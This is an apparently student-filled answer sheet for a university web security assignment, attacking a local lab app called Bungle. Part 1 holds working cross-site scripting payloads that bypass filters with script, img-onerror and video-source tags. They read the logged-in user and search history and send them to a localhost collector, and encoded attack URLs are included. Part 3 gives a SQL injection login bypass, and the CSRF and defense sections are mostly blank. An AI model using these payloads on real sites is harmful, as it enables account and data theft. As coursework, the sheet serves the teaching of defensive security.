COSC 311 Assignment #3: Web Security

Due Date: 10/22/21 at 5:00pm ET

You may work with a partner on this assignment. 
Only one person partnership needs to submit.

Reminder: You may NOT work with the same partner on multiple assignments. 


NAMES: Mia McDuffie

________________________________________________________________________________________

Part 1: Cross-site Scripting (35%)

	1.0) Payload (JavaScript/jQuery):

		<script>
			window.onload = function(){ 
				var username = document.getElementById('logged-in-user').innerHTML;
				var last_search = document.getElementsByClassName("history-item")[1].innerHTML;
				var theUrl = "http://localhost:31337/stolen?user=" + username + "&last_search=" + last_search;
				var xmlHttp = new XMLHttpRequest();
				xmlHttp.open( "GET", theUrl, true );
				xmlHttp.send(null);
			};
		</script>


	1.0) No defense

		http://0.0.0.0:8080/search?xssdefense=0&q=TODO

		http://0.0.0.0:8080/search?q=%09%09%3Cscript%3E+%09%09%09window.onload+%3D+function%28%29%7B++%09%09%09%09var+username+%3D+document.getElementById%28%27logged-in-user%27%29.innerHTML%3B+%09%09%09%09var+last_search+%3D+document.getElementsByClassName%28%22history-item%22%29%5B1%5D.innerHTML%3B+%09%09%09%09var+theUrl+%3D+%22http%3A%2F%2Flocalhost%3A31337%2Fstolen%3Fuser%3D%22+%2B+username+%2B+%22%26last_search%3D%22+%2B+last_search%3B+%09%09%09%09var+xmlHttp+%3D+new+XMLHttpRequest%28%29%3B+%09%09%09%09xmlHttp.open%28+%22GET%22%2C+theUrl%2C+true+%29%3B+%09%09%09%09xmlHttp.send%28null%29%3B+%09%09%09%7D%3B+%09%09%3C%2Fscript%3E


	1.1) Remove "script"


		Payload:
		<IMG SRC="" onerror="
			window.onload = function(){ 
				var username = document.getElementById('logged-in-user').innerHTML;
				var last_search = document.getElementsByClassName('history-item')[1].innerHTML;
				var theUrl = 'http://localhost:31337/stolen?user=' + username + ' &last_search=' + last_search;
				var xmlHttp = new XMLHttpRequest();
				xmlHttp.open( 'GET', theUrl, true );
				xmlHttp.send(null);
			};
		"></img>

		The URL:
		http://0.0.0.0:8080/search?xssdefense=1&q=%09%09%3CIMG+SRC%3D%22%22+onerror%3D%22+%09%09%09window.onload+%3D+function%28%29%7B++%09%09%09%09var+username+%3D+document.getElementById%28%27logged-in-user%27%29.innerHTML%3B+%09%09%09%09var+last_search+%3D+document.getElementsByClassName%28%27history-item%27%29%5B1%5D.innerHTML%3B+%09%09%09%09var+theUrl+%3D+%27http%3A%2F%2Flocalhost%3A31337%2Fstolen%3Fuser%3D%27+%2B+username+%2B+%27+%26last_search%3D%27+%2B+last_search%3B+%09%09%09%09var+xmlHttp+%3D+new+XMLHttpRequest%28%29%3B+%09%09%09%09xmlHttp.open%28+%27GET%27%2C+theUrl%2C+true+%29%3B+%09%09%09%09xmlHttp.send%28null%29%3B+%09%09%09%7D%3B+%09%09%22%3E%3C%2Fimg%3E

		


	1.2) Remove several tags 

		http://0.0.0.0:8080/search?xssdefense=2&q=TODO


		Payload:

		<video><source onerror="
			window.onload = function(){ 
				var username = document.getElementById('logged-in-user').innerHTML;
				var last_search = document.getElementsByClassName('history-item')[1].innerHTML;
				var theUrl = 'http://localhost:31337/stolen?user=' + username + ' &last_search=' + last_search;
				var xmlHttp = new XMLHttpRequest();
				xmlHttp.open( 'GET', theUrl, true );
				xmlHttp.send(null);
			};
		">

		The URL:

		http://0.0.0.0:8080/search?xssdefense=2&q=%09%09%3Cvideo%3E%3Csource+onerror%3D%22+%09%09+%09%09%09window.onload+%3D+function%28%29%7B++%09%09%09%09var+username+%3D+document.getElementById%28%27logged-in-user%27%29.innerHTML%3B+%09%09%09%09var+last_search+%3D+document.getElementsByClassName%28%27history-item%27%29%5B1%5D.innerHTML%3B+%09%09%09%09var+theUrl+%3D+%27http%3A%2F%2Flocalhost%3A31337%2Fstolen%3Fuser%3D%27+%2B+username+%2B+%27+%26last_search%3D%27+%2B+last_search%3B+%09%09%09%09var+xmlHttp+%3D+new+XMLHttpRequest%28%29%3B+%09%09%09%09xmlHttp.open%28+%27GET%27%2C+theUrl%2C+true+%29%3B+%09%09%09%09xmlHttp.send%28null%29%3B+%09%09%09%7D%3B+%09%09+%09%09+%09%09%22%3E


	1.3) Remove " ' and ;

		http://0.0.0.0:8080/search?xssdefense=3&q=TODO

		Payload:

		<video><source onerror="
			var username = document.getElementById('logged-in-user').innerHTML;
			alert(username);
		};
		">



	https://www.hashemian.com/tools/html-url-encode-decode.php
		<video><source onerror="
			window.onload = function(){ 
				var username = document.getElementById('logged-in-user').innerHTML;
				alert(username);
			};
		">

		<script> alert("Hi"); </script>

		<script>
			window.onload = function(){ 

			};


		</script>

			var last_search = document.getElementsByClassName("history-item")[1].innerHTML;
				var theUrl = "http://localhost:31337/stolen?user=" + username + "&last_search=" + last_search;
				var xmlHttp = new XMLHttpRequest();
				xmlHttp.open( "GET", theUrl, true );
				xmlHttp.send(null);

		<script>
			window.onload = function(){ 
				{var username = document.getElementById(`logged-in-user`).innerHTML}
				alert(`Hi`)
			
			};
		</script>





		<video><source onerror="
			window.onload = function(){ 
				var username = document.getElementById('logged-in-user').innerHTML;
				var last_search = document.getElementsByClassName('history-item')[1].innerHTML;
				var theUrl = 'http://localhost:31337/stolen?user=' + username + ' &last_search=' + last_search;
				var xmlHttp = new XMLHttpRequest();
				xmlHttp.open( 'GET', theUrl, true );
				xmlHttp.send(null);
				alert(theUrl);
			};
		">



		theUrl:

		

	

		http://0.0.0.0:8080/search?q=%3CA+HREF%3Dhttp%3A%2F%2Fgoogle.com%2F%3Elink%3C%2FA%3E
		<A HREF=http://google.com/>link</A>
		


	1.4) [Optional extra credit] Encode < and >

		http://0.0.0.0:8080/search?xssdefense=4&q=TODO


________________________________________________________________________________________

Part 2: Cross-site Request Forgery (20%)

	2.0) No defense. Target URL: http://0.0.0.0:8080/login?csrfdefense=0&xssdefense=4

		<html>
			TODO
		</html>


	2.1) Token validation (with XSS). Target URL: http://0.0.0.0:8080/login?csrfdefense=1&xssdefense=0

		<html>
			TODO
		</html>


	2.2) [Optional extra credit] Token validation (without XSS). Target URL: http://0.0.0.0:8080/login?csrfdefense=&xssdefense=4

		<html>
			TODO
		</html>


________________________________________________________________________________________


Part 3: SQL Injection (10%)

	Username: victim
	Password: ' or ' 1=1

________________________________________________________________________________________


Part 4: Better Defenses (35%)

	4.0) bungle_secure.zip (uploaded to Gradescope separately) 	


	4.1) Briefly describe how you implemented password salting and hashing 

		TODO
		

	4.2) Briefly describe the changes you made to database.py to prevent SQL injection attacks

		TODO


	4.3) In 1-2 paragraphs, provide some advice to the Bunglers about how they should 
	     strengthen Bungle!'s defenses to prevent XSS attacks

		TODO


	4.4) In 1-2 paragraphs, provide some advice to the Bunglers about how they should 
	     strengthen Bungle!'s defenses to prevent CSRF attacks

	     	TODO


________________________________________________________________________________________


Additional Questions

	Q1 (ungraded). How did you divide the work between partners? (Put N/A if worked alone)

		[Your answer here]


	Q2 (optional, ungraded). Did you use code snippets from anywhere online that you need to cite?

		---- 1 ----
		https://www.w3schools.com/tags/ref_urlencode.ASP
		https://www.veracode.com/security/xss
		https://www.codegrepper.com/code-examples/javascript/xss+attack+without+script+tag
		https://www.acunetix.com/websitesecurity/cross-site-scripting/
		https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
		https://html5sec.org/


		---- 2 ----
		https://stackoverflow.com/questions/9713058/send-post-data-using-xmlhttprequest


		---- 3 ----
		https://sechow.com/bricks/docs/login-1.html
		https://www.w3schools.com/tags/att_form_method.asp

		---4---

		https://argon2-cffi.readthedocs.io/en/stable/
		https://argon2-cffi.readthedocs.io/en/stable/
		https://argon2-cffi.readthedocs.io/en/stable/api.html#argon2.exceptions.InvalidHash

	Q3 (optional, ungraded). Do you have any suggestions for improving this assignment in the future?

		[Your answer here]